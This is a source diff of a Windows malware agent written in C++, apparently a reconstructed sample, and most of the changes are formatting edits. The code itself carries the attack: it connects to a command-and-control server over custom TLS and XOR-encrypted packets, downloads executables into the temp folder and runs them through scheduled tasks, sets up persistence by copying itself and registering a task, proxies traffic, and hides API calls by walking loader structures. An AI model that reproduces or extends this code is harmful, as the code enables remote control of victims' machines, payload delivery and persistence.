@@ -89,12 +89,13 @@ void utils_hexdump(uint8_t *data, size_t size, bool hex_stream = false)
 	}
 }
 
-void fs_create_file(char* filename, void* filedata, uint32_t filesize, uint32_t creation_disposition, uint32_t move_method)
+void fs_create_file(char *filename, void *filedata, uint32_t filesize, uint32_t creation_disposition, uint32_t move_method)
 {
 	HANDLE handle = {};
 	DWORD result = {};
 
-	do {
+	do
+	{
 		handle = CreateFileA(filename, GENERIC_WRITE, 0, nullptr, creation_disposition, FILE_ATTRIBUTE_NORMAL, nullptr);
 		result = GetLastError();
 	} while (result == ERROR_SHARING_VIOLATION);
@@ -102,7 +103,7 @@ void fs_create_file(char* filename, void* filedata, uint32_t filesize, uint32_t 
 	if (handle != INVALID_HANDLE_VALUE)
 	{
 		SetFilePointer(handle, 0, nullptr, move_method);
-		WriteFile(handle, filedata, filesize, (LPDWORD) & filesize, nullptr);
+		WriteFile(handle, filedata, filesize, (LPDWORD)&filesize, nullptr);
 		CloseHandle(handle);
 	}
 }
@@ -132,39 +133,39 @@ void memory_zero(void *buf, size_t size)
 	memset(buf, 0, size);
 }
 
-void* memory_buffer_append(void** buf1, size_t buf1_size, void* buf2, size_t buf2_size)
+void *memory_buffer_append(void **buf1, size_t buf1_size, void *buf2, size_t buf2_size)
 {
-	void* buffer = memory_buffer_resize(buf1, buf1_size, buf1_size + buf2_size);
-	
+	void *buffer = memory_buffer_resize(buf1, buf1_size, buf1_size + buf2_size);
+
 	if (!buffer)
 	{
-		return nullptr; 
+		return nullptr;
 	}
-	
-	memcpy((uint8_t*)buffer + buf1_size, buf2, buf2_size);
+
+	memcpy((uint8_t *)buffer + buf1_size, buf2, buf2_size);
 	return buffer;
 }
 
 void *windows_load_dll(const char *dllname)
 {
-	wchar_t wdllname[128] = { 0 };
+	wchar_t wdllname[128] = {0};
 	auto entry = NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink;
-	
-	do 
+
+	do
 	{
 		entry = entry->Flink;
 
 		auto module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 		auto module_name = module->BaseDllName.Buffer;
 
-		for (size_t i = 0; ; i++)
+		for (size_t i = 0;; i++)
 		{
 			if (!dllname[i])
 			{
 				return module->DllBase;
 			}
 
-			char c = *(char*)&module_name[i];
+			char c = *(char *)&module_name[i];
 
 			if (module_name[i] < 'A' || module_name[i] > 'Z')
 			{
@@ -187,9 +188,9 @@ void *windows_load_dll(const char *dllname)
 	} while (entry != NtCurrentPeb()->Ldr->InLoadOrderModuleList.Blink);
 
 	auto pLdrLoadDll = reinterpret_cast<decltype(&LdrLoadDll)>(windows_resolve_api(windows_load_dll("ntdll.dll"), "LdrLoadDll"));
-	
+
 	UNICODE_STRING dllname_us;
-	dllname_us.Length = strings_convert_str8_to_str16((char*)dllname, (char*)wdllname);
+	dllname_us.Length = strings_convert_str8_to_str16((char *)dllname, (char *)wdllname);
 	dllname_us.MaximumLength = dllname_us.Length + 2;
 	dllname_us.Buffer = wdllname;
 
@@ -219,32 +220,32 @@ void *windows_resolve_api(void *module_base, const char *api_name)
 	}
 
 	export_dir = (PIMAGE_EXPORT_DIRECTORY)(size_t(module_base) + export_dir_rva);
-	
+
 	uint32_t number_of_names = export_dir->NumberOfNames;
 	uint32_t number_of_functions = export_dir->NumberOfFunctions;
-	uint32_t* address_of_functions = (uint32_t*)(size_t(module_base) + export_dir->AddressOfFunctions);
-	uint32_t* address_of_names = (uint32_t*)(size_t(module_base) + export_dir->AddressOfNames);
-	uint16_t* address_of_name_ordinals = (uint16_t*)(size_t(module_base) + export_dir->AddressOfNameOrdinals);
+	uint32_t *address_of_functions = (uint32_t *)(size_t(module_base) + export_dir->AddressOfFunctions);
+	uint32_t *address_of_names = (uint32_t *)(size_t(module_base) + export_dir->AddressOfNames);
+	uint16_t *address_of_name_ordinals = (uint16_t *)(size_t(module_base) + export_dir->AddressOfNameOrdinals);
 
 	for (size_t i = 0; i < number_of_names; i++)
 	{
-		char* name = (char*)module_base + address_of_names[i];
-		
+		char *name = (char *)module_base + address_of_names[i];
+
 		if (!strings_str_equal(api_name, name))
 		{
 			continue;
 		}
 
 		auto entry = size_t(module_base) + address_of_functions[address_of_name_ordinals[i]];
-		
+
 		if (entry <= (size_t)export_dir || entry > (size_t)export_dir + export_dir_size)
 		{
-			return (void*)entry;
+			return (void *)entry;
 		}
-		
-		char dllname[256] = { 0 };
-		char* export_forward_e = (char*)entry;
-		char* p = (char*)entry;
+
+		char dllname[256] = {0};
+		char *export_forward_e = (char *)entry;
+		char *p = (char *)entry;
 		while (*p != '.')
 		{
 			p++;
@@ -252,7 +253,7 @@ void *windows_resolve_api(void *module_base, const char *api_name)
 
 		memcpy(dllname, export_forward_e, p - export_forward_e);
 		dllname[p - export_forward_e] = '\x00';
-		char* api = p;
+		char *api = p;
 
 		return windows_resolve_api(windows_load_dll(dllname), api);
 	}
@@ -263,7 +264,7 @@ void windows_ts_delete_task(char *task_name)
 	ITaskScheduler *task_sched;
 	wchar_t l_task_name[128] = {};
 
-	HRESULT result = CoCreateInstance(CLSID_CTaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&task_sched);
+	HRESULT result = CoCreateInstance(CLSID_CTaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID *)&task_sched);
 
 	if (result == S_OK)
 	{
@@ -277,9 +278,9 @@ void windows_ts_delete_task(char *task_name)
 
 void windows_ts_create_task(char *task_name, char *binary_path, char *parameters, bool one_time, bool run_immediatly)
 {
-	ITaskScheduler* task_sched{};
-	ITask* task{};
-	ITaskTrigger* task_trigger{};
+	ITaskScheduler *task_sched{};
+	ITask *task{};
+	ITaskTrigger *task_trigger{};
 	wchar_t username[512] = {};
 	wchar_t l_parameters[128] = {};
 	wchar_t l_binary_path[256] = {};
@@ -289,7 +290,7 @@ void windows_ts_create_task(char *task_name, char *binary_path, char *parameters
 	SYSTEMTIME system_time{};
 	FILETIME file_time{};
 	TASK_TRIGGER ttask_trigger{};
-	IPersistFile* persist_file{};
+	IPersistFile *persist_file{};
 	HRESULT result = {};
 
 	strings_convert_str8_to_str16(task_name, (char *)l_task_name);
@@ -299,8 +300,8 @@ void windows_ts_create_task(char *task_name, char *binary_path, char *parameters
 
 	CoInitialize(nullptr);
 	CoCreateInstance(CLSID_CTaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID *)&task_sched);
-	
-	if (task_sched->NewWorkItem(l_task_name, CLSID_CTask, IID_ITask, (IUnknown**)&task) < 0)
+
+	if (task_sched->NewWorkItem(l_task_name, CLSID_CTask, IID_ITask, (IUnknown **)&task) < 0)
 	{
 		task_sched->Release();
 		CoUninitialize();
@@ -314,7 +315,7 @@ void windows_ts_create_task(char *task_name, char *binary_path, char *parameters
 
 	if (parameters)
 	{
-		strings_convert_str8_to_str16(parameters, (char*)l_parameters);
+		strings_convert_str8_to_str16(parameters, (char *)l_parameters);
 		task->SetParameters(l_parameters);
 	}
 
@@ -327,7 +328,7 @@ void windows_ts_create_task(char *task_name, char *binary_path, char *parameters
 		CoUninitialize();
 		return;
 	}
-	
+
 	GetLocalTime(&system_time);
 	SystemTimeToFileTime(&system_time, &file_time);
 
@@ -361,8 +362,8 @@ void windows_ts_create_task(char *task_name, char *binary_path, char *parameters
 	ttask_trigger.wEndMonth = 1;
 	ttask_trigger.wEndDay = 1;
 	task_trigger->SetTrigger(&ttask_trigger);
-	
-	if (task->QueryInterface(IID_IPersistFile, (void**)&persist_file) < 0)
+
+	if (task->QueryInterface(IID_IPersistFile, (void **)&persist_file) < 0)
 	{
 		task_trigger->Release();
 		task->Release();
@@ -396,21 +397,21 @@ void windows_ts_create_task(char *task_name, char *binary_path, char *parameters
 bool windows_is_process_running(const char *process_name)
 {
 	bool found = false;
-	
+
 	HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	PROCESSENTRY32 pentry = {sizeof(pentry)};
 
 	auto pProcess32First = reinterpret_cast<decltype(&Process32First)>(windows_resolve_api(windows_load_dll("kernel32.dll"), "Process32First"));
-	
+
 	if (!pProcess32First(hsnap, &pentry))
 	{
 		goto exit;
 	}
 
 	decltype(&Process32Next) pProcess32Next;
-	do 
+	do
 	{
-		char exename[256] = { 0 };
+		char exename[256] = {0};
 		memcpy(exename, pentry.szExeFile, strlen(pentry.szExeFile));
 
 		if (strings_str_equal(exename, process_name))
@@ -457,8 +458,7 @@ DWORD WINAPI agent_create_window(LPVOID param)
 		nullptr,
 		nullptr,
 		hInstance,
-		nullptr
-	);
+		nullptr);
 
 	ShowWindow(hWnd, 1);
 	UpdateWindow(hWnd);
@@ -586,7 +586,7 @@ in_addr net_dns_resolve(const char *domain, int family)
 	return result;
 }
 
-SOCKET net_tls_connect(const char* host, uint32_t port, PCtxtHandle context, PCredHandle cred, SOCKET& socket)
+SOCKET net_tls_connect(const char *host, uint32_t port, PCtxtHandle context, PCredHandle cred, SOCKET &socket)
 {
 	socket_set_t socket_set{};
 	sockaddr_in server_address{};
@@ -602,14 +602,14 @@ SOCKET net_tls_connect(const char* host, uint32_t port, PCtxtHandle context, PCr
 	SecBufferDesc indesc = {};
 
 	SecBuffer outbuffers = {.cbBuffer = 0, .BufferType = SECBUFFER_TOKEN, .pvBuffer = nullptr};
-	SecBufferDesc outdesc = {.ulVersion = 0, .cBuffers = 1, .pBuffers = &outbuffers };
+	SecBufferDesc outdesc = {.ulVersion = 0, .cBuffers = 1, .pBuffers = &outbuffers};
 
 	*cred = {};
 	*context = {};
 
 	if (AcquireCredentialsHandleA(
 			nullptr,
-			(SEC_CHAR*)UNISP_NAME_A,
+			(SEC_CHAR *)UNISP_NAME_A,
 			SECPKG_CRED_OUTBOUND,
 			nullptr,
 			&schannel_cred,
@@ -654,7 +654,7 @@ SOCKET net_tls_connect(const char* host, uint32_t port, PCtxtHandle context, PCr
 	InitializeSecurityContextA(
 		cred,
 		nullptr,
-		(SEC_CHAR*)host,
+		(SEC_CHAR *)host,
 		flags,
 		0,
 		SECURITY_NATIVE_DREP,
@@ -663,8 +663,7 @@ SOCKET net_tls_connect(const char* host, uint32_t port, PCtxtHandle context, PCr
 		context,
 		&outdesc,
 		&ctxattr,
-		nullptr
-	);
+		nullptr);
 
 	if (outbuffers.cbBuffer == 0 || outbuffers.pvBuffer == 0)
 	{
@@ -691,8 +690,8 @@ SOCKET net_tls_connect(const char* host, uint32_t port, PCtxtHandle context, PCr
 			received += n;
 		}
 
-		// We now received a Token from the server, to let InitializeSecurityContextA process it we pass it 
-		// an input buffer, and for the output buffer we just set it as null, and that we want the next out buffer by 
+		// We now received a Token from the server, to let InitializeSecurityContextA process it we pass it
+		// an input buffer, and for the output buffer we just set it as null, and that we want the next out buffer by
 		// setting the type as SECBUFFER_TOKEN.
 
 		outbuffers.cbBuffer = 0;
@@ -703,11 +702,11 @@ SOCKET net_tls_connect(const char* host, uint32_t port, PCtxtHandle context, PCr
 		outdesc.cBuffers = 1;
 		outdesc.pBuffers = &outbuffers;
 
-		inbuffers[0] = { .cbBuffer = received, .BufferType = SECBUFFER_TOKEN, .pvBuffer = incoming_buffer };
-		inbuffers[1] = { .cbBuffer = 0,   .BufferType = SECBUFFER_EMPTY, .pvBuffer = nullptr };
-		
+		inbuffers[0] = {.cbBuffer = received, .BufferType = SECBUFFER_TOKEN, .pvBuffer = incoming_buffer};
+		inbuffers[1] = {.cbBuffer = 0, .BufferType = SECBUFFER_EMPTY, .pvBuffer = nullptr};
+
 		indesc.ulVersion = SECBUFFER_VERSION;
-		indesc.cBuffers = 2; 
+		indesc.cBuffers = 2;
 		indesc.pBuffers = inbuffers;
 
 		status = InitializeSecurityContextA(
@@ -722,8 +721,7 @@ SOCKET net_tls_connect(const char* host, uint32_t port, PCtxtHandle context, PCr
 			nullptr,
 			&outdesc,
 			&ctxattr,
-			nullptr
-		);
+			nullptr);
 
 		if (status == SEC_E_INCOMPLETE_MESSAGE)
 		{
@@ -774,17 +772,16 @@ void net_tls_send(SOCKET socket, void *data, int len, HANDLE event, PCtxtHandle 
 	SecBufferDesc buffersdesc = {};
 	SecPkgContext_StreamSizes stream_sizes = {};
 	QueryContextAttributesA(phContext, SECPKG_ATTR_STREAM_SIZES, &stream_sizes);
-	
+
 	size_t pos = 0;
-	while(len > 0)
+	while (len > 0)
 	{
-		void* msgbuf = VirtualAlloc(
-			nullptr, 
+		void *msgbuf = VirtualAlloc(
+			nullptr,
 			stream_sizes.cbHeader + stream_sizes.cbMaximumMessage + stream_sizes.cbTrailer,
-			MEM_COMMIT | MEM_RESERVE, 
-			PAGE_READWRITE
-		);
-		
+			MEM_COMMIT | MEM_RESERVE,
+			PAGE_READWRITE);
+
 		if (!msgbuf)
 		{
 			break;
@@ -796,7 +793,7 @@ void net_tls_send(SOCKET socket, void *data, int len, HANDLE event, PCtxtHandle 
 			chunk_length = stream_sizes.cbMaximumMessage;
 		}
 
-		memcpy((char *)msgbuf + stream_sizes.cbHeader, (char*)data + pos, chunk_length);
+		memcpy((char *)msgbuf + stream_sizes.cbHeader, (char *)data + pos, chunk_length);
 		pos += chunk_length;
 		len -= chunk_length;
 
@@ -822,24 +819,24 @@ void net_tls_send(SOCKET socket, void *data, int len, HANDLE event, PCtxtHandle 
 
 		EncryptMessage(phContext, 0, &buffersdesc, 0);
 		net_socket_send(socket, msgbuf, buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer, event);
-		memory_free((void**)&msgbuf);
+		memory_free((void **)&msgbuf);
 	}
 }
 
-size_t net_tls_recv(SOCKET socket, void** pbuffer, PCtxtHandle context)
+size_t net_tls_recv(SOCKET socket, void **pbuffer, PCtxtHandle context)
 {
 	size_t incoming_buffer_size = 0x8000;
 	SECURITY_STATUS status = 0;
 	size_t received = 0;
 	size_t copied = 0;
-	auto incoming_buffer = (uint8_t*)VirtualAlloc(nullptr, incoming_buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	
+	auto incoming_buffer = (uint8_t *)VirtualAlloc(nullptr, incoming_buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
 	if (!incoming_buffer)
 	{
 		return 0;
 	}
 
-	for(;;)
+	for (;;)
 	{
 		if (received == 0 || status == SEC_E_INCOMPLETE_MESSAGE)
 		{
@@ -848,7 +845,7 @@ size_t net_tls_recv(SOCKET socket, void** pbuffer, PCtxtHandle context)
 			while (!bytes_remaining)
 			{
 				incoming_buffer_size += 0x8000;
-				memory_buffer_resize((void**) & incoming_buffer, received, incoming_buffer_size);
+				memory_buffer_resize((void **)&incoming_buffer, received, incoming_buffer_size);
 				bytes_remaining = incoming_buffer_size - received;
 			}
 
@@ -856,28 +853,27 @@ size_t net_tls_recv(SOCKET socket, void** pbuffer, PCtxtHandle context)
 
 			if (n <= 0)
 			{
-				memory_free((void**)&incoming_buffer);
+				memory_free((void **)&incoming_buffer);
 				return 0;
 			}
 
 			received += n;
 		}
 
-		SecBuffer buffers[4] = { 0 };
+		SecBuffer buffers[4] = {0};
 
-		buffers[0] = { received, SECBUFFER_DATA, incoming_buffer };
-		buffers[1] = { 0, SECBUFFER_EMPTY, nullptr };
-		buffers[2] = { 0, SECBUFFER_EMPTY, nullptr };
-		buffers[3] = { 0, SECBUFFER_EMPTY, nullptr };
+		buffers[0] = {received, SECBUFFER_DATA, incoming_buffer};
+		buffers[1] = {0, SECBUFFER_EMPTY, nullptr};
+		buffers[2] = {0, SECBUFFER_EMPTY, nullptr};
+		buffers[3] = {0, SECBUFFER_EMPTY, nullptr};
 
-		SecBufferDesc buffersdesc = { .ulVersion = 0, .cBuffers = 4, .pBuffers = buffers };
+		SecBufferDesc buffersdesc = {.ulVersion = 0, .cBuffers = 4, .pBuffers = buffers};
 
 		status = DecryptMessage(
 			context,
 			&buffersdesc,
 			0,
-			nullptr
-		);
+			nullptr);
 
 		if (status == SEC_E_INCOMPLETE_MESSAGE)
 		{
@@ -887,14 +883,14 @@ size_t net_tls_recv(SOCKET socket, void** pbuffer, PCtxtHandle context)
 		if (status == SEC_I_CONTEXT_EXPIRED || status == SEC_E_OK)
 		{
 			received = 0;
-			
+
 			for (size_t i = 1; i <= 3; i++)
 			{
 				if (buffers[i].BufferType == SECBUFFER_DATA && buffers[i].pvBuffer != nullptr && buffers[i].cbBuffer != 0)
 				{
 					if (!memory_buffer_append(pbuffer, copied, buffers[i].pvBuffer, buffers[i].cbBuffer))
 					{
-						memory_free((void**)&incoming_buffer);
+						memory_free((void **)&incoming_buffer);
 						return 0;
 					}
 
@@ -911,14 +907,14 @@ size_t net_tls_recv(SOCKET socket, void** pbuffer, PCtxtHandle context)
 
 			if (status != SEC_I_CONTINUE_NEEDED)
 			{
-				memory_free((void**)&incoming_buffer);
+				memory_free((void **)&incoming_buffer);
 				return copied;
 			}
 		}
 
 		else
 		{
-			memory_free((void**)&incoming_buffer);
+			memory_free((void **)&incoming_buffer);
 			break;
 		}
 	}
@@ -949,18 +945,18 @@ size_t net_tls_download_file(const char *host, size_t port, const char *filepath
 	SOCKET socket;
 	size_t received = 0;
 	socket_set_t socket_set;
-	void* incoming_buffer = nullptr;
-	void* block = nullptr;
-	uint8_t request[1024] = { 0 };
+	void *incoming_buffer = nullptr;
+	void *block = nullptr;
+	uint8_t request[1024] = {0};
 	int request_len = 0;
 
 	if (net_tls_connect(host, port, &context, &cred, socket))
 	{
-		request_len = sprintf((char*)request, (const char*)g_http_request, filepath, host);
+		request_len = sprintf((char *)request, (const char *)g_http_request, filepath, host);
 		net_tls_send(socket, request, request_len, nullptr, &context);
-		net_socket_init(socket, 0, &socket_set, { .tv_sec = 10, .tv_usec = 0 });
+		net_socket_init(socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});
 
-		while (select(0, (fd_set*)&socket_set, nullptr, nullptr, &socket_set.timeout) != 0)
+		while (select(0, (fd_set *)&socket_set, nullptr, nullptr, &socket_set.timeout) != 0)
 		{
 			int n = net_tls_recv(socket, &block, &context);
 
@@ -981,13 +977,13 @@ size_t net_tls_download_file(const char *host, size_t port, const char *filepath
 	{
 		while (n >= 4)
 		{
-			if (*(uint32_t*)incoming_buffer == '\r\n\r\n')
+			if (*(uint32_t *)incoming_buffer == '\r\n\r\n')
 			{
 				n -= 4;
-				incoming_buffer = (char*)incoming_buffer + 4; 
+				incoming_buffer = (char *)incoming_buffer + 4;
 				received = n;
-				auto p = (char*)VirtualAlloc(nullptr, received, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-				
+				auto p = (char *)VirtualAlloc(nullptr, received, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
 				if (p)
 				{
 					memcpy(p, incoming_buffer, received);
@@ -997,11 +993,11 @@ size_t net_tls_download_file(const char *host, size_t port, const char *filepath
 				}
 			}
 
-			incoming_buffer = (char*)incoming_buffer + 1;
+			incoming_buffer = (char *)incoming_buffer + 1;
 			n -= 1;
 		}
 	}
-	
+
 	memory_free(&incoming_buffer);
 	return 0;
 }
@@ -1029,7 +1025,7 @@ int net_socket_send(SOCKET socket, void *data, size_t len, HANDLE event)
 
 	while (len != 0 && blocks_count != 0)
 	{
-		net_socket_init(socket, 0, &socket_set, { .tv_sec = 10, .tv_usec = 0 });
+		net_socket_init(socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});
 
 		if (select(0, nullptr, (fd_set *)&socket_set, nullptr, &socket_set.timeout) != 1)
 		{
@@ -1371,8 +1367,8 @@ DWORD WINAPI agent_proxy_routine(LPVOID lpThreadParameter)
 	break;
 	}
 
-	 u_long nonblocking = 1;
-	 ioctlsocket(proxy_socket, FIONBIO, &nonblocking);
+	u_long nonblocking = 1;
+	ioctlsocket(proxy_socket, FIONBIO, &nonblocking);
 
 	if (proxy_context->control.addr_type == address_type_t::IPv4)
 	{
@@ -1555,16 +1551,16 @@ int agent_main_loop(char *addr, uint16_t port)
 
 	for (;;)
 	{
-		net_socket_init(main_socket, 0, &socket_set, { .tv_sec = 10, .tv_usec = 0 });
+		net_socket_init(main_socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});
 
 		int ready_sockets = select(0, (fd_set *)&socket_set, nullptr, nullptr, &socket_set.timeout);
 
-		if (ready_sockets < 0)	
+		if (ready_sockets < 0)
 		{
 			goto close_conn;
 		}
 
-		else if(ready_sockets == 0)
+		else if (ready_sockets == 0)
 		{
 			if (remaining_bytes != 0 || pos != 0)
 			{
@@ -1639,24 +1635,24 @@ int agent_main_loop(char *addr, uint16_t port)
 
 			void *filedata = {};
 			size_t filesize = net_download_file((char *)file_download->url, &filedata);
-			
-			auto response = (file_download_response_t*)buffer + 1;
+
+			auto response = (file_download_response_t *)buffer + 1;
 			response->length = 4;
-			response->file_download_id = ((control_packet_t*)buffer)->file_download_id;
-			crypto(g_xor_key, sizeof(g_xor_key), (uint8_t*)response, sizeof(file_download_response_t));
-			net_socket_send(main_socket, (void*)response, sizeof(file_download_response_t), event);
+			response->file_download_id = ((control_packet_t *)buffer)->file_download_id;
+			crypto(g_xor_key, sizeof(g_xor_key), (uint8_t *)response, sizeof(file_download_response_t));
+			net_socket_send(main_socket, (void *)response, sizeof(file_download_response_t), event);
 
 			auto filepath = buffer;
 			int filepathlen = GetTempPathA(512, (LPSTR)filepath);
-			int filenamelen = rand_get_string((char*) & filepath[filepathlen]);
+			int filenamelen = rand_get_string((char *)&filepath[filepathlen]);
 			filepathlen += filenamelen;
-			strcpy((char*)&filepath[filepathlen], ".exe");
-			fs_create_file((char*)filepath, filedata, filesize, CREATE_ALWAYS, FILE_BEGIN);
+			strcpy((char *)&filepath[filepathlen], ".exe");
+			fs_create_file((char *)filepath, filedata, filesize, CREATE_ALWAYS, FILE_BEGIN);
 
-			char* task_name = (char*) & buffer[512];
+			char *task_name = (char *)&buffer[512];
 			rand_get_string(task_name);
-		
-			windows_ts_create_task(task_name, (char*)filepath, nullptr, true, false);
+
+			windows_ts_create_task(task_name, (char *)filepath, nullptr, true, false);
 		}
 
 		else if (packet_header->established_connection)
@@ -1722,35 +1718,36 @@ LRESULT WINAPI agent_window_proc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lPar
 	return DefWindowProcA(hWnd, Msg, wParam, lParam);
 }
 
-int strings_wstring_bytecount(const wchar_t* s)
+int strings_wstring_bytecount(const wchar_t *s)
 {
-	wchar_t* p = (wchar_t*)s;
-	while (*s++ != 0);
-	return (char*)s - (char*)p - 2;
+	wchar_t *p = (wchar_t *)s;
+	while (*s++ != 0)
+		;
+	return (char *)s - (char *)p - 2;
 }
 
-int strings_compare_wide(const wchar_t* s1, const wchar_t* s2)
+int strings_compare_wide(const wchar_t *s1, const wchar_t *s2)
 {
 	int len = strings_wstring_bytecount(s1);
-	
+
 	if (memcmp(s2, s1, len))
 	{
 		return 0;
 	}
-	
+
 	return len;
 }
 
-bool strings_str_equal(const char* s1, const char* s2)
+bool strings_str_equal(const char *s1, const char *s2)
 {
 	int ln = strlen(s1);
-	
+
 	if (ln != strlen(s2))
 	{
 		return false;
 	}
 
-	while(ln != 0)
+	while (ln != 0)
 	{
 		if (*s1 != *s2)
 		{
@@ -1765,16 +1762,16 @@ bool strings_str_equal(const char* s1, const char* s2)
 	return true;
 }
 
-int cmd_argument_exists(const char* arg)
+int cmd_argument_exists(const char *arg)
 {
 	int argcount = 0;
-	wchar_t cmdarg[128] = { 0 };
+	wchar_t cmdarg[128] = {0};
 	auto command_line = GetCommandLineW();
 	auto args = CommandLineToArgvW(command_line, &argcount);
-	
+
 	if (argcount > 1)
 	{
-		strings_convert_str8_to_str16((char*)arg, (char*)cmdarg);
+		strings_convert_str8_to_str16((char *)arg, (char *)cmdarg);
 		return strings_compare_wide(args[1], cmdarg);
 	}
 
@@ -1784,8 +1781,8 @@ int cmd_argument_exists(const char* arg)
 BOOL WINAPI agent_remove_artifacts(HWND hwnd, LPARAM lParam)
 {
 	DWORD pid = {};
-	char buffer[256] = { 0 };
-	char window_name[256] = { 0 };
+	char buffer[256] = {0};
+	char window_name[256] = {0};
 
 	GetWindowThreadProcessId(hwnd, &pid);
 
@@ -1802,7 +1799,7 @@ BOOL WINAPI agent_remove_artifacts(HWND hwnd, LPARAM lParam)
 		if (strings_str_equal(window_name, "Microsoft"))
 		{
 			HANDLE proch = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
-			
+
 			if (GetModuleFileNameExA(proch, nullptr, buffer, sizeof(buffer)))
 			{
 				Sleep(SECONDS(1));
@@ -1833,9 +1830,9 @@ void agent_connect_to_c2()
 	{
 		// Sleep(MINUTES(1));
 	} while (WSAStartup(MAKEWORD(2, 2), &wsd));
-	
-	char* ip = g_config.Host1 + 6;
-	int port = atoi((char*)g_config.Port1 + 6);
+
+	char *ip = g_config.Host1 + 6;
+	int port = atoi((char *)g_config.Port1 + 6);
 
 	while (agent_main_loop(ip, port) < 0)
 	{
@@ -1866,12 +1863,12 @@ DWORD windows_get_process_integrity_level()
 
 	auto token_mandatory_level = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_MANDATORY_LABEL));
 	GetTokenInformation(token, (_TOKEN_INFORMATION_CLASS)TokenIntegrityLevel, token_mandatory_level, sizeof(TOKEN_MANDATORY_LABEL), &rsize);
-	
+
 	if (rsize > 8)
 	{
 		LocalFree(token_mandatory_level);
 		token_mandatory_level = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LMEM_FIXED, rsize);
-		
+
 		if (!GetTokenInformation(token, (_TOKEN_INFORMATION_CLASS)TokenIntegrityLevel, token_mandatory_level, rsize, &rsize))
 		{
 			goto ret;
@@ -1889,14 +1886,14 @@ ret:
 int main()
 {
 	CreateThread(nullptr, 0, agent_create_window, agent_window_proc, 0, nullptr);
-	
+
 	auto start2_arg_exists = cmd_argument_exists("start2");
-	char* infection_id;
+	char *infection_id;
 	if (start2_arg_exists)
 	{
 		auto entry = (PLDR_DATA_TABLE_ENTRY)(NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink);
 		auto exename = entry->BaseDllName.Buffer;
-		size_t i = 0; 
+		size_t i = 0;
 
 		infection_id = g_infection_id;
 		while (exename[i] != '.')
@@ -1912,8 +1909,8 @@ int main()
 	}
 
 	CreateMutexA(nullptr, false, g_infection_id);
-	
-	// if start2 argument is present connect to c2, 
+
+	// if start2 argument is present connect to c2,
 	// else create scheduled task of the same file and exit.
 
 	if (start2_arg_exists)
@@ -1924,37 +1921,35 @@ int main()
 		}
 		else
 		{
-			goto connect_to_c2_and_persist;
+			goto persist;
 		}
 	}
 
 	else
 	{
 		EnumWindows(agent_remove_artifacts, 0);
-		//Sleep(SECONDS(10));
+		// Sleep(SECONDS(10));
 
 		// Low Integrity Process like Browsers, unsure if what was the use ?
-		// was it injected into browsers before ? but also doing so is desired because 
+		// was it injected into browsers before ? but also doing so is desired because
 		// a low integrity process can't create schedualed tasks.
-		if (windows_get_process_integrity_level() == 4096)	
+		if (windows_get_process_integrity_level() == 4096)
 		{
 			agent_connect_to_c2();
 		}
 
-connect_to_c2_and_persist:
-		agent_connect_to_c2();
-
+	persist:
 		if (windows_is_process_running("a2guard.exe"))
 		{
-			char binary_path[0x100] = { 0 };
-			char taskpath[0x100] = { 0 };
+			char binary_path[0x100] = {0};
+			char taskpath[0x100] = {0};
 			GetModuleFileNameA(nullptr, binary_path, 0x100);
 			agent_create_persistance_directory(taskpath, infection_id);
 			CopyFileA(binary_path, taskpath, false);
-			windows_ts_create_task(infection_id, taskpath, (char*)"start2", false, true);
+			windows_ts_create_task(infection_id, taskpath, (char *)"start2", false, true);
 		}
 	}
-	
+
 exit:
 	Sleep(SECONDS(60));
 	ExitProcess(0);
